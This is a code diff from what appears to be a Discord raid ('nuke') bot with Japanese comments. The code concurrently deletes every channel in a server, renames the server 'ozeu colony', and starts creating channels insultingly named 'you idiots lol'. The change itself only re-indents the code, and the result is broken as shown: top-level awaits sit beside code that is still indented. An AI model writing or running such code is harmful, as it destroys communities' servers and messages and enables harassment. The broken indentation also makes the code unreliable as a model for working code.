@@ -161,22 +161,22 @@ for owner in owners:
 
 await ctx.send(embed=embed_start)
 
-    # --- チャンネル削除関数（エラーはログ出力のみ）---
-    async def delete_channel(channel):
-        try:
-            await channel.delete()
-        except Exception as e:
-            print(f"[ozeu] {channel.name} の削除でエラー: {e}")
-
-    await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
-
-    # サーバー名変更
+# --- チャンネル削除関数（エラーはログ出力のみ）---
+async def delete_channel(channel):
     try:
-        await guild.edit(name="ozeu植民地")
+        await channel.delete()
     except Exception as e:
-        print(f"[ozeu] サーバー名の変更でエラー: {e}")
+        print(f"[ozeu] {channel.name} の削除でエラー: {e}")
 
-    # --- チャンネル作成関数 ---
+await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
+
+# サーバー名変更
+try:
+    await guild.edit(name="ozeu植民地")
+except Exception as e:
+    print(f"[ozeu] サーバー名の変更でエラー: {e}")
+
+# --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
             return await guild.create_text_channel(name="バカどもがｗ")
